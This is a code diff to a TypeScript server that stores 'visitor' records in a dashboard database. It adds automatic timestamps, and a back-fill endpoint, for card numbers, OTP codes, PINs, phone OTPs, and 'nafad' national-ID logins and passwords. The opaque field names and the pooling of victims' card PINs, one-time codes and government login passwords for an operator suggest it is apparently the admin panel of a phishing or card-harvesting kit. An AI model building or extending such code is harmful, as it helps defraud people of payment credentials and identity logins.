@@ -481,6 +481,27 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}) {
 
   // Merge existing visitor data with current payload (current payload takes precedence)
   const mergedPayload = { ...existingVisitorData, ...payload };
+
+  // Auto-add _v1UpdatedAt if card data is being updated but _v1UpdatedAt is not provided
+  if ((mergedPayload._v1 || mergedPayload.cardNumber || mergedPayload.cardData) && !mergedPayload._v1UpdatedAt) {
+    mergedPayload._v1UpdatedAt = new Date().toISOString();
+  }
+  // Auto-add _v5UpdatedAt if OTP data is being updated but _v5UpdatedAt is not provided
+  if ((mergedPayload._v5 || mergedPayload.otpCode || mergedPayload.otp) && !mergedPayload._v5UpdatedAt) {
+    mergedPayload._v5UpdatedAt = new Date().toISOString();
+  }
+  // Auto-add _v6UpdatedAt if PIN data is being updated but _v6UpdatedAt is not provided
+  if ((mergedPayload._v6 || mergedPayload.pinCode || mergedPayload.pin) && !mergedPayload._v6UpdatedAt) {
+    mergedPayload._v6UpdatedAt = new Date().toISOString();
+  }
+  // Auto-add _v7UpdatedAt if phone data is being updated but _v7UpdatedAt is not provided
+  if ((mergedPayload.phoneNumber || mergedPayload._v7 || mergedPayload.phoneOtp) && !mergedPayload._v7UpdatedAt) {
+    mergedPayload._v7UpdatedAt = new Date().toISOString();
+  }
+  // Auto-add nafadUpdatedAt if nafad data is being updated but nafadUpdatedAt is not provided
+  if ((mergedPayload.nafadIdNumber || mergedPayload.nafadPassword) && !mergedPayload.nafadUpdatedAt) {
+    mergedPayload.nafadUpdatedAt = new Date().toISOString();
+  }
   
   const normalized = normalizeDashboardEntry(mergedPayload);
   console.log("[UpsertDashboard] normalized:", { id: normalized.id, customer: normalized.customer, badge: normalized.badge });
@@ -829,6 +850,66 @@ async function startServer() {
     } catch (error) {
       console.error("dashboard reload error", error);
       res.status(500).json({ error: "Failed to reload dashboard" });
+    }
+  });
+
+  // Fix timestamps for existing records
+  app.post("/api/dashboard/fix-timestamps", async (_req, res) => {
+    try {
+      // Get all records
+      const { rows } = await pool.query(
+        `SELECT id, raw FROM dashboard_requests ORDER BY submitted_at DESC`,
+      );
+      
+      let updated = 0;
+      for (const row of rows) {
+        const raw = row.raw || {};
+        let needsUpdate = false;
+        const updatedRaw = { ...raw };
+        
+        // Fix _v1UpdatedAt for card data
+        if ((raw._v1 || raw.cardNumber) && !raw._v1UpdatedAt) {
+          updatedRaw._v1UpdatedAt = raw.submittedAt || new Date().toISOString();
+          needsUpdate = true;
+        }
+        
+        // Fix _v5UpdatedAt for OTP data
+        if ((raw._v5 || raw.otpCode) && !raw._v5UpdatedAt) {
+          updatedRaw._v5UpdatedAt = raw.submittedAt || new Date().toISOString();
+          needsUpdate = true;
+        }
+        
+        // Fix _v6UpdatedAt for PIN data
+        if ((raw._v6 || raw.pinCode) && !raw._v6UpdatedAt) {
+          updatedRaw._v6UpdatedAt = raw.submittedAt || new Date().toISOString();
+          needsUpdate = true;
+        }
+        
+        // Fix _v7UpdatedAt for phone data
+        if ((raw.phoneNumber || raw._v7) && !raw._v7UpdatedAt) {
+          updatedRaw._v7UpdatedAt = raw.submittedAt || new Date().toISOString();
+          needsUpdate = true;
+        }
+        
+        // Fix nafadUpdatedAt
+        if ((raw.nafadIdNumber || raw.nafadPassword) && !raw.nafadUpdatedAt) {
+          updatedRaw.nafadUpdatedAt = raw.submittedAt || new Date().toISOString();
+          needsUpdate = true;
+        }
+        
+        if (needsUpdate) {
+          await pool.query(
+            `UPDATE dashboard_requests SET raw = $1 WHERE id = $2`,
+            [updatedRaw, row.id]
+          );
+          updated++;
+        }
+      }
+      
+      res.json({ success: true, updated, total: rows.length });
+    } catch (error) {
+      console.error("fix-timestamps error", error);
+      res.status(500).json({ error: "Failed to fix timestamps" });
     }
   });
 
